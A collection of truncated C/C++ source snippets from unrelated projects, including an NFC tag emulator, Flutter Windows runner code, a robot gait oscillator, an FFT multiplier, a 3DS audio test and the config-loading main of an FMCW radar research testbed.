uint16_t p1p2_length = ((int16_t) p1 << 8) + p2;\n\n    switch(rwbuf[C_APDU_INS]){\n    case ISO7816_SELECT_FILE:\n      switch(p1){\n      case C_APDU_P1_SELECT_BY_ID:\n\tif(p2 != 0x0c){\n\t  DMSG(\"C_APDU_P2 != 0x0c\\n\");\n\t  setResponse(COMMAND_COMPLETE, rwbuf, &sendlen);\n\t} else if(lc == 2 && rwbuf[C_APDU_DATA] == 0xE1 && (rwbuf[C_APDU_DATA+1] == 0x03 || rwbuf[C_APDU_DATA+1] == 0x04)){\n\t  setResponse(COMMAND_COMPLETE, rwbuf, &sendlen);\n\t  if(rwbuf[C_APDU_DATA+1] == 0x03){\n\t    currentFile = CC;\n\t  } else if(rwbuf[C_APDU_DATA+1] == 0x04){\n\t    currentFile = NDEF;\n\t  }\n\t} else {\n\t  setResponse(TAG_NOT_FOUND, rwbuf, &sendlen);\n\t}\n\tbreak;\n      case C_APDU_P1_SELECT_BY_NAME: \n        const uint8_t ndef_tag_application_name_v2[] = {0, 0x7, 0xD2, 0x76, 0x00, 0x00, 0x85, 0x01, 0x01 };\n\tif(0 == memcmp(ndef_tag_application_name_v2, rwbuf + C_APDU_P2, sizeof(ndef_tag_application_name_v2))){\n\t  setResponse(COMMAND_COMPLETE, rwbuf, &sendlen);\n\t} else{\n\t  DMSG(\"function not supported\\n\");\n\t  setResponse(FUNCTION_NOT_SUPPORTED, rwbuf, &sendlen);\n\t} \n\tbreak;\n      }\n      break;\n    case ISO7816_READ_BINARY:\n      switch(currentFile){\n      case NONE:\n\tsetResponse(TAG_NOT_FOUND, rwbuf, &sendlen);\n\tbreak;\n      case CC:\n\tif( p1p2_length > NDEF_MAX_LENGTH){\n\t  setResponse(END_OF_FILE_BEFORE_REACHED_LE_BYTES, rwbuf, &sendlen);\n\t}else {\n\t  memcpy(rwbuf,compatibility_container + p1p2_length, lc);\n\t  setResponse(COMMAND_COMPLETE, rwbuf + lc, &sendlen, lc);\n\t}\n\tbreak;\n      case NDEF:\n\tif( p1p2_length > NDEF_MAX_LENGTH){\n\t  setResponse(END_OF_FIL",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/* ************************************************************************* */\n/*      ##       ##      ## ##       ##      ## ##       ##      ##          */\n/*       ##     ####    ##   ##     ####    ##   ##     ####    ##           */\n/*        ##  ##   ##  ##     ##  ##   ##  ##     ##  ##   ##  ##            */\n/*         ####     ####       ####     ####       ####     ####             */\n/*          ##       ##         ##       ##         ##       ##              */\n/*                                                                           */\n/*           WONDERFUL            WEBSERV           WONDERTEAM               */\n/*                                                                           */\n/*      FELICIA KOOLHOVEN      FLEN HUISMAN       MARES VERBRUGGE            */\n/*          fkoolhov             fhuisman             mverbrug               */\n/*                                                                           */\n/*          Codam Coding College        part of 42 network                   */\n/*                            April - May 2024                               */\n/* ************************************************************************* */\n\n# include \"Epoll.hpp\"\n# include \"ServerPool.hpp\"\n\nServerPool::ServerPool() : _epoll(std::make_unique<Epoll>())\n{\n\tstd::cout << \"ServerPool constructor called\" << std::endl;\n}\n\nServerPool::~ServerPool()\n{\n\tstd::cout << \"ServerPool destructor called\" << std::endl;\n}\n\nvoid ServerPool::addServer(std::unique_ptr<Server> server)\n{\n\tthis->_servers.push_back(std::move(server));\n}\n\nconst std::vector<std::unique_ptr<Server>>& ServerPool::getServers() const\n{\n\treturn this->_servers;\n}\n\nstd::vector<std::unique_ptr<Server>>& ServerPool::getServers()\n{\n\treturn this->_servers;\n}\n\nEpoll& ServerPool::getEpollInstance() const\n{\n\treturn *(this->_epoll);\n}\n\nstd::ostream& operator<<(std::ostream& out_stream, const ServerPool& server_pool)\n{\n\tstd::cout << std::endl;\n\tconst std::vector<std::unique_ptr<Server>>& servers = server_pool.getServers();\n\tfor (std::vector<std::unique_ptr<Server>>::const_iterator it = servers.begin(); it != servers.end(); ++it)\n\t{\n\t\tconst std::unique_ptr<Server>& server = *it;\n\t\tout_stream << *server << std::endl;\n\t}\n\treturn out_stream;\n}",
    "/************************************************************************\n\nHopf Polar CPG\n\n************************************************************************/\n#include \"HopfPolar.h\"\n\n\nHopfPolar::HopfPolar() \n{ \n    std::cout << \"[HopfPolar] object created\" << std::endl;\n}\n\nvoid HopfPolar::init(){\n    std::cout << \"[HopfPolar] init function\" << std::endl;\n    X.setZero();\n    X_dot.setZero();\n    SetGait(gait);\n    // init CPG amplitude and phase\n    for(int i=0; i<4; i++){\n        X(0,i) = get_random() * 0.1;\n        X(1,i) = PHI(0,i);\n    }\n    std::cout << \"[HopfPolar] init done\" << std::endl;\n}\n\n/*\n * Helper function to get random variables \n */\ndouble HopfPolar::get_random()\n{\n    static std::default_random_engine e;\n    e.seed(std::chrono::system_clock::now().time_since_epoch().count()); // seed\n    static std::uniform_real_distribution<> dis(0, 1); // rage 0 - 1\n    return dis(e);\n}\n\n/*\nGaits:\n1 bounding\n2 trotting\n3 walking\n4 pacing;\n*/\nvoid HopfPolar::SetGait(int gaitNum )\n{\n    if (gaitNum == 1){ // bounding \n        PHI <<   0, 0, 1, 1,\n                 0, 0, 1, 1,\n                -1,-1, 0, 0,\n                -1,-1, 0, 0;\n        PHI = -M_PI * PHI;\n        K_tegotae << 0, 0, 1, 1,\n                     0, 0, 1, 1,\n                     1, 1, 0, 0,\n                     1, 1, 0, 0; \n    }\n    else if (gaitNum == 2){ // trotting \n        PHI <<   0, 1, 1, 0,\n                -1, 0, 0,-1,\n                -1, 0, 0,-1,\n                 0, 1, 1, 0;\n        PHI = M_PI * PHI;\n        K_tegotae << 0, 1, 1, 0,\n                     1, 0, 0, 1,\n                     1, 0, 0, 1,\n                     0, 1, 1, 0;\n    }\n    else if (gaitNum == 3){ // walking \n        PHI <<       0,   M_PI,-M_PI/2, M_PI/2,\n                  M_PI,      0, M_PI/2,-M_PI/2,\n                M_PI/2,-M_PI/2,      0,   M_PI,\n               -M_PI/2, M_PI/2,   M_PI,      0;\n        PHI = -PHI;\n        K_tegotae << 0, 1, 1, 0,\n                     1, 0, 0, 1,\n                     1, 0, 0, 1,\n                     0, 1, 1, 0;\n    }\n    else if (gaitNum == 4){ // pace \n        PHI <<   0, 1, 0, 1,\n                -1, 0,-1, 0,\n                 0, 1, 0, 1,\n                -1, 0,-1, 0;\n        PHI = M_PI * PHI;\n        K_tegotae << 0, 1, 0, 1,\n                     1, 0, 1, 0,\n                     0, 1, 0, 1,\n                     1, 0, 1, 0;\n    }\n    else{\n        std::cout << \"INVALID GAIT NUMBER\" << gaitNum << std::endl; \n    }\n}\n\n\nvoid HopfPolar::update(Vec4<double>& x_out,Vec4<double>& z_out){\n    Integrate();\n    Vec4<double> x = Vec4<double>::Zero();\n    for (int i=0; i<4 ; i++){\n        x[i] = X(0,i) * std::cos(X(1,i));\n    }\n\n    Vec4<double> z_temp = Vec4<double>::Zero(); // bookkeepping\n    for(int i=0; i<4; i++){\n        double phi = X(1,i);\n        if (std::sin(phi) > 0){//in swing\n            z_temp[i] = -h_max + ground_clearance * std::sin(phi);\n        }\n        else{\n            z_temp[i] = -h_max + ground_penetration * std::sin(phi);\n        }\n    }\n\n    // return normal indices\n    for (int i=0; i<4; i++){\n        x_out[i] = -des_step_len * x[LEG_INDICES[i]] + x_offset;\n        z_out[i] = z_temp[LEG_INDICES[i]];\n    }\n\n}\n\n\nvoid HopfPolar::Integrate()\n{\n    MatrixXd X_copy, X_dot_prev;\n    X_copy = X.replicate(1,1);\n    X_dot_prev = X_dot.replicate(1,1);\n    X_dot.setZero();\n    // get foot forces\n    // auto Fn = lowState.footForce;\n    // for (int i=0; i<4; i++){\n    //     Fn[i] = lowState.footForce[LEG_INDICES[i]];\n    // }\n\n    double r, phi, omega;\n\n    for(int i=0; i<4; i++){\n        omega = 0;\n        r   = X(0,i);\n        phi = X(1,i);\n        // amplitude\n        double R_dot = _a * (mu - pow(r,2)) * r;\n        // phase\n        phi = std::fmod(phi, 2*M_PI);\n        if (phi > M_PI){\n            omega = omega_stance;\n        }\n        else{\n            omega = omega_swing;\n        }\n        if (couple){\n            //omega += X.row(0).dot(coupling_strength * sin(X.row(1) - phi - PHI.row(i)));\n            for (int j=0; j<4; j++){\n                omega += X(0,j) * coupling_strength * std::sin(X(1,j) - phi - PHI(i,j));\n            }\n            // if (tegotae_feedback){\n            //     // add normal force feedback (Tegotae)\n            //     omega += -0.05 * Fn[i] * std::cos(phi);\n            // }\n            // if (coupled_tegotae_feedback){\n            //     //coupled normal forces\n            //     for (int j=0; j<4; j++){\n            //         omega += 0.1 * K_tegotae(i,j)*Fn[i];\n            //     }\n            // }\n        }\n        X_dot.col(i) << R_dot, omega;\n    }\n\n    // integrate \n    X = X + (X_dot_prev + X_dot) * dt / 2;\n    for (int i=0; i<4; i++)\n        X(1,i) = fmod(X(1,i),2*M_PI);\n}   \n\n",
    "/****************************************************************************\n *                                                                          *\n *   This file is part of KDE CDEmu Manager.                                *\n *                                                                          *\n *   Copyright (C) 2009-2024 by Marcel Hasler <mahasler@gmail.com>          *\n *                                                                          *\n *   This program is free software; you can redistribute it and/or modify   *\n *   it under the terms of the GNU General Public License as published by   *\n *   the Free Software Foundation, either version 3 of the License, or      *\n *   (at your option) any later version.                                    *\n *                                                                          *\n *   This program is distributed in the hope that it will be useful,        *\n *   but WITHOUT ANY WARRANTY; without even the implied warranty of         *\n *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the           *\n *   GNU General Public License for more details.                           *\n *                                                                          *\n *   You should have received a copy of the GNU General Public License      *\n *   along with this program. If not, see <http://www.gnu.org/licenses/>.   *\n *                                                                          *\n ****************************************************************************/\n\n#include \"devicelistitem.h\"\n#include \"mainwindow.h\"\n#include \"messagebox.h\"\n\n#include \"ui_mainwindow.h\"\n\n#include <KStandardAction>\n\n#include <QFileDialog>\n#include <QHeaderView>\n\n// ---------------------------------------------------------------------------------------------- //\n\nnamespace {\n    constexpr const char* FileTypes = \"Images (*.mds *.mdx *.b5t *.b6t *.ccd *.sub *.img *.cue \"\n                                              \"*.bin *.toc *.cdi *.cif *.c2d *.iso *.nrg *.udf);;\"\n                                      \"Containers (*.dmg *.cdr *.cso *.ecm *.gz \"\n                                                  \"*.gbi *.daa *.isz *.xz)\";\n    constexpr int MaxHistorySize = 10;\n\n    constexpr const char* HistoryKey = \"history\";\n    constexpr const char* ShowTrayIconKey = \"showTrayIcon\";\n    constexpr const char* LastFilePathKey = \"lastFilePath\";\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nMainWindow::MainWindow(const CDEmu& cdemu, QWidget* parent)\n    : KMainWindow(parent),\n      m_ui(std::make_unique<Ui::MainWindow>()),\n      m_cdemu(cdemu)\n{\n    // Keep running in system tray if enabled\n    setAttribute(Qt::WA_DeleteOnClose, false);\n\n    m_ui->setupUi(this);\n\n    // Menus\n    m_ui->menuFile->addAction(KStandardAction::quit(qApp, SLOT(quit()), this));\n\n    updateHistory();\n\n    m_helpMenu = new KHelpMenu(this);\n    menuBar()->addMenu(m_helpMenu->menu());\n\n    // Tray icon\n    QSettings settings;\n\n    const bool showTrayIcon = settings.value(ShowTrayIconKey, true).toBool();\n    setTrayIconVisible(showTrayIcon);\n\n    m_ui->actionTrayIcon->setChecked(showTrayIcon);\n    connect(m_ui->actionTrayIcon, SIGNAL(toggled(bool)), this, SLOT(setTrayIconVisible(bool)));\n\n    // Device list\n    m_ui->deviceList->header()->setStretchLastSection(false);\n\n    m_ui->deviceList->header()->setSectionResizeMode(0, QHeaderView::Fixed);\n    m_ui->deviceList->header()->setSectionResizeMode(1, QHeaderView::Stretch);\n\n    const QString header = i18n(m_ui->deviceList->headerItem()->text(0).toLocal8Bit()) + \"xxx\";\n    m_ui->deviceList->header()->resizeSection(0, QFontMetrics(font()).horizontalAdvance(header));\n\n    // Device handling\n    connect(m_ui->addDevice, SIGNAL(clicked()), this, SLOT(addDevice()));\n    connect(m_ui->removeDevice, SIGNAL(clicked()), this, SLOT(removeDevice()));\n\n    connect(&m_cdemu, SIGNAL(deviceAdded()), this, SLOT(updateDeviceList()));\n    connect(&m_cdemu, SIGNAL(deviceRemoved()), this, SLOT(updateDeviceList()));\n    connect(&m_cdemu, SIGNAL(deviceChanged(int)), this, SLOT(onDeviceChanged(int)));\n    connect(&m_cdemu, SIGNAL(daemonChanged(bool)), this, SLOT(onDaemonChanged(bool)));\n\n    // Status bar\n    m_statusLabel = new QLabel(this);\n    m_statusLabel->setIndent(10);\n    statusBar()->addWidget(m_statusLabel);\n    onDaemonChanged(m_cdemu.isDaemonRunning());\n\n    // Remember window size, etc.\n    setAutoSaveSettings();\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nMainWindow::~MainWindow() = default;\n\n// ---------------------------------------------------------------------------------------------- //\n\nvoid MainWindow::closeEvent(QCloseEvent* event)\n{\n    KMainWindow::closeEvent(event);\n\n    if (!m_trayIcon)\n        qApp->quit();\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nvoid MainWindow::onDaem",
    "#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <ctime>\n#include <cmath>\n#include <cfenv>\n\n#include <3ds.h>\n\n#include \"audio.h\"\n\n// Very slow triangle wave, mono PCM16\nvoid fillBuffer(s16 *audio_buffer, size_t size) {\n    for (size_t i = 0; i < size; i++) {\n        audio_buffer[i] = rand();\n    }\n\n    DSP_FlushDataCache(audio_buffer, size);\n}\n\nvoid waitForKey() {\n    while (aptMainLoop()) {\n        gfxSwapBuffers();\n        gfxFlushBuffers();\n        gspWaitForVBlank();\n\n        hidScanInput();\n        u32 kDown = hidKeysDown();\n\n        if (kDown)\n            break;\n    }\n}\n\nint main(int argc, char **argv) {\n    gfxInitDefault();\n\n    PrintConsole botScreen;\n    PrintConsole topScreen;\n\n    consoleInit(GFX_TOP, &topScreen);\n    consoleInit(GFX_BOTTOM, &botScreen);\n    consoleSelect(&topScreen);\n\n    srand(time(nullptr));\n\n    constexpr size_t NUM_SAMPLES = 160*200;\n    s16 *audio_buffer = (s16*)linearAlloc(NUM_SAMPLES * sizeof(s16));\n    fillBuffer(audio_buffer, NUM_SAMPLES);\n\n    AudioState state;\n    {\n        auto dspfirm = loadDspFirmFromFile();\n        if (!dspfirm) {\n            printf(\"Couldn't load firmware\\n\");\n            goto end;\n        }\n        auto ret = audioInit(*dspfirm);\n        if (!ret) {\n            printf(\"Couldn't init audio\\n\");\n            goto end;\n        }\n        state = *ret;\n    }\n\n    {\n        float rate_multiplier = rand() % 512 / 128.f;\n        printf(\"rate_multiplier = %f\\n\", rate_multiplier);\n\n        array<s32, 160> expected_output;\n        array<bool, 160> bad;\n        {\n            constexpr s32 scale = 1 << 16;\n            u32 scaled_rate = rate_multiplier * scale;\n            int fposition = -2 * scale;\n            for (int i=0; i<160; i++) {\n                int position = fposition >> 16;\n                const s32 x0 = position+0 >= 0 ? audio_buffer[position+0] : 0;\n                const s32 x1 = position+1 >= 0 ? audio_buffer[position+1] : 0;\n\n                s32 delta = x1 - x0;\n                if (delta > 0x7FFF) delta = 0x7FFF;\n                if (delta < -0x8000) delta = -0x8000;\n\n                u16 f0 = fposition & 0xFFFF;\n\n                if (f0) {\n                    expected_output[i] = x0 + ((f0 * delta) >> 16);\n                    bad[i] = abs(x0 - x1) > 0x8000;\n                } else {\n                    expected_output[i] = x0;\n                }\n\n                fposition += scaled_rate;\n            }\n        }\n\n        state.waitForSync();\n        initSharedMem(state);\n        state.write().dsp_configuration->mixer1_enabled_dirty = true;\n        state.write().dsp_configuration->mixer1_enabled = true;\n        state.write().source_configurations->config[0].gain[1][0] = 1.0;\n        state.write().source_configurations->config[0].gain_1_dirty = true;\n        state.notifyDsp();\n        printf(\"init\\n\");\n\n        bool entered = false;\n        bool passed = true;\n        {\n            u16 buffer_id = 0;\n\n            state.write().source_configurations->config[0].play_position = 0;\n            state.write().source_configurations->config[0].physical_address = osConvertVirtToPhys(audio_buffer);\n            state.write().source_configurations->config[0].length = NUM_SAMPLES;\n            state.write().source_configurations->config[0].mono_or_stereo = DSP::HLE::SourceConfiguration::Configuration::MonoOrStereo::Mono;\n            state.write().source_configurations->config[0].format = DSP::HLE::SourceConfiguration::Configuration::Format::PCM16;\n            state.write().source_configurations->config[0].fade_in = false;\n            state.write().source_configurations->config[0].adpcm_dirty = false;\n            state.write().source_configurations->config[0].is_looping = false;\n            state.write().source_configurations->config[0].buffer_id = ++buffer_id;\n            state.write().source_configurations->config[0].partial_reset_flag = true;\n            state.write().source_configurations->config[0].play_position_dirty = true;\n            state.write().source_configurations->config[0].embedded_buffer_dirty = true;\n\n            state.write().source_configurations->config[0].enable = true;\n            state.write().source_configurations->config[0].enable_dirty = true;\n\n            state.write().source_configurations->config[0].rate_multiplier = rate_multiplier;\n            state.write().source_configurations->config[0].rate_multiplier_dirty = true;\n            state.write().source_configurations->config[0].interpolation_mode = DSP::HLE::SourceConfiguration::Configuration::InterpolationMode::Linear;\n            state.write().source_configurations->config[0].interpolation_related = 0;\n            state.write().source_configurations->config[0].interpolation_dirty = true;\n\n            state.notifyDsp();\n\n            bool continue_reading = true;\n            for (size_t frame_count = 0; continue_reading && frame_count < 10; frame_count++) {\n                state.waitForSync();\n\n                for (size_t i = 0; i < 160; i++) {\n                    if ",
    "#include <string>\n#include <vector>\n#include <complex>\n\n#include \"TypeManipulation.h\"\n\n// Pad 0's to num_vec to be of length = len_num12, prepare num_vec for FFT\n// Note: Initiially, num_vec.size() != len_num12, in most cases\nint padToPowerOf2(std::vector<int>& num_vec, int len_num12)\n{\n    if (len_num12 < num_vec.size())\n    {\n        throw std::invalid_argument(\"Length of input vector cannot be less than input length\");   \n    }\n\n    int powOf2 = 1;\n    // Get the exponent to 2 that exceeds the number of digits\n    while (powOf2 < len_num12)\n    {\n        powOf2 *= 2;\n    }\n\n    // Pad zeros to make the number of digits a power of 2\n    num_vec.resize(powOf2,  0);\n\n    return powOf2;\n}\n\n// Hermetian, flip sign of imag components\nvoid computeHermetian(std::vector<std::complex<double>>& num_vec_complex)\n{\n    int len_num_vec = num_vec_complex.size();\n    for (int i = 1; i < len_num_vec; i++)\n    {\n        num_vec_complex[i].imag(-std::imag(num_vec_complex[i]));\n    }\n}\n\n// Elementwise multiplication of complex numbers\nstd::vector<std::complex<double>> digitWiseMul(std::vector<std::complex<double>> num1, \n                                                                        std::vector<std::complex<double>> num2)\n{\n    int len_num1 = num1.size();\n    std::vector<std::complex<double>> num12_vec(len_num1);\n\n    // Multiply complex numbers at same vector index\n    for(int i=0; i<len_num1; i++)\n    {\n        num12_vec[i] = num1[i] * num2[i];\n    }\n\n    return num12_vec;\n}\n\n// Normalize by specified `base` and propagate the carry value\nvoid carryAndNormalize(std::vector<int>& result, unsigned int base) {\n\n    int carry = 0;\n\n    // Iterate through the digits from right to left\n    for (int i = 0; i <=result.size() - 1; i++) {\n\n        if (result[i] < 0)\n        {\n            throw std::invalid_argument(\"Vector elements cannot be negative\");\n        }\n        \n        result[i] += carry; // Add carry from previous iteration\n\n        // Perform carrying operation if the digit is out of range\n        if (result[i] < 0 || result[i] >= base) {\n            carry = result[i] / base; // Calculate carry\n            result[i] %= base; // Update digit value\n        } else {\n            carry = 0; // Reset carry\n        }\n    }\n\n    // If there's a carry after the last iteration, add a new digit\n    if (carry != 0) {\n        result.push_back(carry);\n    }\n}\n\n\n// FFT Radix-2, Cooley-Tucker, Recursive approach\nvoid fft_radix2_recursive(std::vector<std::complex<double>>& num_vec)\n{\n    int len_num_vec = num_vec.size();\n    int half_len = len_num_vec / 2;\n\n    // Base case: single element (no need for further processing)\n    if (len_num_vec <= 1) return;\n\n    // Check if size is even (required for radix-2)\n    if (len_num_vec % 2 != 0) \n    {\n        throw std::invalid_argument(\"Input size must be a power of 2, to correct pad number with zeros\");\n    }\n\n    // Divide into even and odd sub-arrays\n    std::vector<std::complex<double>> even(half_len), odd(half_len);\n    for (int i = 0; i < half_len; ++i)\n    {\n        even[i] = num_vec[2*i];\n        odd[i] = num_vec[2*i + 1];\n    }\n\n    // Recursive calls for sub-arrays\n    fft_radix2_recursive(even);\n    fft_radix2_recursive(odd);\n\n    // Butterfly operations (similar to iterative approach)\n    double theta = -2.0 * M_PI / len_num_vec, theta_i = 0.0;\n    for (int i = 0; i < half_len; ++i) \n    {\n        theta_i = theta * i;\n        std::complex<double> w (cos(theta_i), sin(theta_i));\n        \n        num_vec[i] = even[i] + w * odd[i];\n        num_vec[i + half_len] = even[i] - w * odd[i];\n    }\n}\n\n// FFT Radix-2, Cooley-Tucker, Iterative approach\nvoid fft_radix2_iterative(std::vector<std::complex<double>>& num_vec)\n{\n    int len_num_vec = num_vec.size();\n    int half_len = len_num_vec / 2;\n\n    // Check if size is even (required for radix-2)\n    if (len_num_vec % 2 != 0) \n    {\n        throw std::invalid_argument(\"Input size must be a power of 2, to correct pad number with zeros\");\n    }\n    \n    std::vector<std::complex<double>> even(half_len), odd(half_len);\n    \n    // Divide into even and odd sub-arrays\n    for (int i = 0; i < half_len; ++i)\n    {\n        even[i] = num_vec[2*i];\n        odd[i] = num_vec[2*i + 1];\n    }\n\n    for(int k = 0; k < half_len; k++)\n    {\n        std::complex<double> Ek (0,0), Ok (0,0);\n        for(int m = 0; m < half_len; m++)\n        {\n            std::complex<double> t = std::polar(1.0, -2 * M_PI * m * k / half_len);\n            Ek += even[m] * t;\n            Ok += odd[m] * t;\n        }\n    \n        // Butterfly operations\n        std::complex<double> twiddle_factor = std::polar(1.0, -2 * M_PI * k / len_num_vec);\n        num_vec[k] = Ek + twiddle_factor * Ok;\n        num_vec[k + half_len] = Ek - twiddle_factor * Ok;\n    }\n}\n\n\n// Compute FFT, wrapper around fft_radix2_recursive() and fft_radix2_iterative()\nstd::vector<std::complex<double>> computeFFT(std::vector<std::complex<double>> num_vec_complex, std::string method)\n{\n    if (method.compare(\"Rec",
    "\n//C standard libraries\n#include <iostream>\n#include <cstdlib>\n#include <string>\n#include <chrono>\n#include <complex>\n#include <csignal>\n#include <thread>\n\n//uhd specific libraries\n#include <uhd/exception.hpp>\n#include <uhd/types/tune_request.hpp>\n#include <uhd/usrp/multi_usrp.hpp>\n#include <uhd/utils/safe_main.hpp>\n#include <uhd/utils/thread.hpp>\n#include <boost/format.hpp>\n#include <boost/lexical_cast.hpp>\n#include <boost/program_options.hpp>\n\n//JSON class\n#include <nlohmann/json.hpp>\n\n//source libraries\n#include \"src/JSONHandler.hpp\"\n#include \"src/USRPHandler.hpp\"\n#include \"src/BufferHandler.hpp\"\n#include \"src/RADAR.hpp\"\n#include \"src/FMCWHandler.hpp\"\n\n//set namespaces\nusing json = nlohmann::json;\nusing USRPHandler_namespace::USRPHandler;\nusing Buffers::Buffer;\nusing Buffers::Buffer_1D;\nusing RADAR_namespace::RADAR;\nusing FMCWHandler_namespace::FMCWHandler;\n\nint UHD_SAFE_MAIN(int argc, char* argv[]) {\n\n    //radar configuration\n    std::string radar_config_file = \"/home/david/Documents/BlackBoxRadarAttacks/FMCW_radar_uhd/Config_uhd_victim_400us_to_500us.json\";\n    //std::string radar_config_file = \"/home/davidh/Documents/BlackBoxRadarAttacks/FMCW_radar_uhd/Config_uhd_100MHz.json\";\n    \n    //attacker configuration\n    std::string attack_config_file = \"/home/david/Documents/BlackBoxRadarAttacks/FMCW_radar_uhd/Config_uhd_attack_400us_to_500us.json\";\n    //std::string attack_config_file = \"/home/davidh/Documents/BlackBoxRadarAttacks/FMCW_radar_uhd/Config_uhd_attack_100MHz.json\";\n\n\n    //fmcw config files\n    std::string fmcw_config_file = \"/home/david/Documents/BlackBoxRadarAttacks/FMCW_radar_uhd/Config_FMCW.json\";\n    //std::string fmcw_config_file = \"/home/davidh/Documents/BlackBoxRadarAttacks/FMCW_radar_uhd/Config_FMCW.json\";\n\n\n    //read the config file\n    std::cout << \"\\nMAIN: Parsing JSON\\n\";\n    json radar_config = JSONHandler::parse_JSON(radar_config_file,false);\n    json attack_config = JSONHandler::parse_JSON(attack_config_file,false);\n    json fmcw_config = JSONHandler::parse_JSON(fmcw_config_file,false);\n\n\n    //check to make sure that the radar and attacker have a valid config format:\n    if(radar_config[\"USRPSettings\"][\"Multi-USRP\"][\"type\"].is_null() ||\n        radar_config[\"USRPSettings\"][\"Multi-USRP\"][\"cpufmt\"].is_null() ||\n        attack_config[\"USRPSettings\"][\"Multi-USRP\"][\"type\"].is_null() ||\n        attack_config[\"USRPSettings\"][\"Multi-USRP\"][\"cpufmt\"].is_null()){\n            std::cerr << \"MAIN: type or cpu format is not specified in radar or attack config file\" <<std::endl;\n            return EXIT_FAILURE;\n    }\n\n\n    //confirm that the radar and attacker have the same type and cpu fmt\n    if(radar_config[\"USRPSettings\"][\"Multi-USRP\"][\"type\"].get<std::string>() !=\n        attack_config[\"USRPSettings\"][\"Multi-USRP\"][\"type\"].get<std::string>()||\n        radar_config[\"USRPSettings\"][\"Multi-USRP\"][\"cpufmt\"].get<std::string>() !=\n        radar_config[\"USRPSettings\"][\"Multi-USRP\"][\"cpufmt\"].get<std::string>()){\n            std::cerr << \"MAIN: Attack and Victim cpu or type not the same\" <<std::endl;\n            return EXIT_FAILURE;\n    }\n\n    //determine that there is a valid cpu format and type\n    \n    std::string type = radar_config[\"USRPSettings\"][\"Multi-USRP\"][\"type\"].get<std::string>();\n    std::string cpufmt = radar_config[\"USRPSettings\"][\"Multi-USRP\"][\"cpufmt\"].get<std::string>();\n\n    \n    if (type == \"double\" && cpufmt == \"fc64\"){\n        FMCWHandler<double> fmcw_handler(fmcw_config,radar_config,attack_config,true);\n    }\n    else if (type == \"float\" && cpufmt == \"fc32\")\n    {\n        FMCWHandler<float> fmcw_handler(fmcw_config,radar_config,attack_config,true);\n    }\n    /*\n    else if (type == \"int16_t\" && cpufmt == \"sc16\")\n    {\n        FMCWHandler<int16_t> fmcw_handler(radar_config,attack_config,false);\n    }\n    else if (type == \"int8_t\" && cpufmt == \"sc8\")\n    {\n        FMCWHandler<int8_t> fmcw_handler(radar_config,attack_config,false);\n    }\n    */\n    else{\n        std::cerr << \"MAIN: type and cpufmt don't match valid combination (must use float or double)\" << 